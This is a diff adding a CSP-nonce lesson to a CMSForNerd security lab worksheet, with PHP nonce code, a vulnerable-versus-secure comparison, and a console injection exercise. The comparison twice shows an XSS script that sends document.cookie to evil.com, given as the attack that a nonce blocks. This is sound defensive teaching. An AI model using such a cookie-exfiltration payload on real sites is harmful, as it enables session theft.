@@ -45,9 +45,122 @@ include "contents/" . $page . ".php";</code></pre>
     </section>
 
     <section class="step">
-        <h2>🧪 Step 3: Neutralizing XSS with CSP</h2>
-        <p>Even if an attacker injects a malicious script, a strong <strong>Content Security Policy</strong> can block its execution.</p>
-        <p><strong>Task:</strong> Open <code>themes/CmsForNerd/bodytop.tpl</code> and locate the CSP meta tag. Update it to <strong>MUST NOT</strong> allow scripts from untrusted domains.</p>
+        <h2>🛡️ Step 3: CSP Nonces - Google-Grade XSS Protection</h2>
+        <p>Even if an attacker injects a malicious script, a strong <strong>Content Security Policy with nonces</strong> can block its execution.</p>
+        
+        <div class="concept-box">
+            <h3>What is a Nonce?</h3>
+            <p>A <strong>nonce</strong> (number used once) is a cryptographically random string generated for each page load. 
+            Only scripts with this exact nonce are allowed to execute.</p>
+        </div>
+
+        <h3>📋 Task 3.1: Understand the Implementation</h3>
+        <p>Study how CMSForNerd implements CSP nonces across three critical files:</p>
+        
+        <div class="file-study">
+            <h4>File 1: includes/SecurityUtils.php</h4>
+            <p>Open this file and find the <code>generateNonce()</code> method:</p>
+            <div class="code-block modern">
+                <pre><code>public static function generateNonce(): string
+{
+    // Generate a 128-bit (16-byte) random nonce
+    return base64_encode(random_bytes(16));
+}</code></pre>
+            </div>
+            <p><strong>Question:</strong> Why do we use <code>random_bytes(16)</code> instead of <code>rand()</code>?</p>
+            <p class="answer-hint">💡 Click to reveal: <code>random_bytes()</code> is cryptographically secure (unpredictable), while <code>rand()</code> is predictable and can be cracked.</p>
+        </div>
+
+        <div class="file-study">
+            <h4>File 2: includes/CmsContext.php</h4>
+            <p>Find where the nonce is stored:</p>
+            <div class="code-block modern">
+                <pre><code>public string $cspNonce;
+
+public function __construct(
+    // ... parameters
+    ?string $cspNonce = null,
+) {
+    $this->cspNonce = $cspNonce ?? SecurityUtils::generateNonce();
+}</code></pre>
+            </div>
+            <p><strong>Task:</strong> Add a <code>var_dump($ctx->cspNonce);</code> in <code>index.php</code> to see the nonce. Reload the page multiple times - does it change?</p>
+        </div>
+
+        <div class="file-study">
+            <h4>File 3: contents/common-headertag.inc</h4>
+            <p>Locate the CSP header and script tags:</p>
+            <div class="code-block modern">
+                <pre><code>&lt;meta http-equiv="Content-Security-Policy" 
+      content="script-src 'self' 'nonce-&lt;?= $ctx-&gt;cspNonce ?&gt;' ..."&gt;
+
+&lt;script type="application/ld+json" nonce="&lt;?= $ctx-&gt;cspNonce ?&gt;"&gt;
+    {/* JSON-LD data */}
+&lt;/script&gt;</code></pre>
+            </div>
+        </div>
+
+        <h3>🧪 Task 3.2: The XSS Attack Simulation</h3>
+        <p><strong>Scenario:</strong> An attacker injects malicious JavaScript into your page.</p>
+        
+        <div class="comparison-grid">
+            <div class="vulnerable-code">
+                <h4>❌ Without CSP Nonce (Vulnerable)</h4>
+                <div class="code-block legacy">
+                    <pre><code>&lt;!-- Legitimate script --&gt;
+&lt;script&gt;
+    console.log("Normal operation");
+&lt;/script&gt;
+
+&lt;!-- ATTACKER INJECTED THIS! --&gt;
+&lt;script&gt;
+    document.location='http://evil.com?cookie='+document.cookie;
+&lt;/script&gt;</code></pre>
+                </div>
+                <p class="danger">🚨 Both scripts execute! User cookies stolen!</p>
+            </div>
+
+            <div class="secure-code">
+                <h4>✅ With CSP Nonce (Secure)</h4>
+                <div class="code-block modern">
+                    <pre><code>&lt;!-- Legitimate script with nonce --&gt;
+&lt;script nonce="dGhpc2lzYXJhbmRvbQ=="&gt;
+    console.log("Normal operation");
+&lt;/script&gt;
+
+&lt;!-- ATTACKER INJECTED THIS! --&gt;
+&lt;script&gt;
+    document.location='http://evil.com?cookie='+document.cookie;
+&lt;/script&gt;</code></pre>
+                </div>
+                <p class="success">✅ Only first script runs! Injected script blocked by CSP!</p>
+            </div>
+        </div>
+
+        <h3>🔬 Live Challenge: Attack Your Own Site!</h3>
+        <ol>
+            <li>Open your browser's DevTools (<kbd>F12</kbd>)</li>
+            <li>Go to the <strong>Console</strong> tab</li>
+            <li>Try to inject a script:
+                <div class="code-block">
+                    <pre><code>var script = document.createElement('script');
+script.textContent = 'alert("I hacked you!");';
+document.body.appendChild(script);</code></pre>
+                </div>
+            </li>
+            <li><strong>Expected Result:</strong> You should see an error:
+                <div class="console-output">
+                    <pre>❌ Refused to execute inline script because it violates the following 
+   Content Security Policy directive: "script-src 'self' 'nonce-XXXXX'".</pre>
+                </div>
+            </li>
+        </ol>
+
+        <p><strong>Full Guide:</strong> For a comprehensive tutorial with best practices, see the 
+        <a href="csp-nonce-guide.php" class="guide-link">🛡️ CSP Nonce Implementation Guide</a></p>
+    </section>
+
+    <section class="step">
         <div class="code-block html">
             <pre><code>&lt;meta http-equiv="Content-Security-Policy" content="
     default-src 'self'; 
@@ -117,9 +230,24 @@ include "contents/" . $page . ".php";</code></pre>
 .lab-worksheet .terminal-block { background: #000; color: #00ff00; padding: 1rem; font-family: 'Courier New', Courier, monospace; border-radius: 4px; margin: 1rem 0; }
 .lab-worksheet .question-box { background: #d9edf7; border: 1px solid #bce8f1; color: #31708f; padding: 1rem; border-radius: 4px; margin: 2rem 0; }
 .lab-worksheet .standards-summary { margin-top: 3rem; background: #f5f5f5; padding: 1.5rem; border-radius: 8px; }
+.lab-worksheet .concept-box { background: #e7f3ff; padding: 1.5rem; border-radius: 8px; border-left: 5px solid #0066cc; margin: 1.5rem 0; }
+.lab-worksheet .file-study { background: #f8f9fa; padding: 1.5rem; border-radius: 8px; margin: 1.5rem 0; border: 1px solid #dee2e6; }
+.lab-worksheet .file-study h4 { color: #495057; margin-top: 0; }
+.lab-worksheet .comparison-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin: 2rem 0; }
+.lab-worksheet .vulnerable-code { background: #fff; padding: 1.5rem; border-radius: 8px; border-left: 5px solid #dc3545; }
+.lab-worksheet .secure-code { background: #fff; padding: 1.5rem; border-radius: 8px; border-left: 5px solid #28a745; }
+.lab-worksheet .danger { color: #dc3545; font-weight: bold; }
+.lab-worksheet .success { color: #28a745; font-weight: bold; }
+.lab-worksheet .console-output { background: #2d2d2d; color: #f8f8f2; padding: 1rem; border-radius: 4px; margin: 0.5rem 0; }
+.lab-worksheet kbd { background: #333; color: #fff; padding: 0.2rem 0.5rem; border-radius: 3px; font-family: monospace; font-size: 0.9rem; }
+.lab-worksheet .guide-link { display: inline-block; background: #c7254e; color: white; padding: 0.5rem 1rem; text-decoration: none; border-radius: 4px; margin: 1rem 0; }
+.lab-worksheet .guide-link:hover { background: #a02040; }
 .progress-nav { display: flex; justify-content: space-between; margin-top: 3rem; padding: 2rem 0; border-top: 2px solid #eee; }
 .progress-nav .btn { padding: 1rem 1.5rem; border-radius: 4px; text-decoration: none; font-weight: bold; }
 .progress-nav .prev { background: #6c757d; color: #fff; }
 .progress-nav .next { background: #d9534f; color: #fff; }
-@media (max-width: 768px) { .progress-nav { flex-direction: column; gap: 1rem; } }
+@media (max-width: 768px) { 
+    .progress-nav { flex-direction: column; gap: 1rem; } 
+    .lab-worksheet .comparison-grid { grid-template-columns: 1fr; }
+}
 </style>
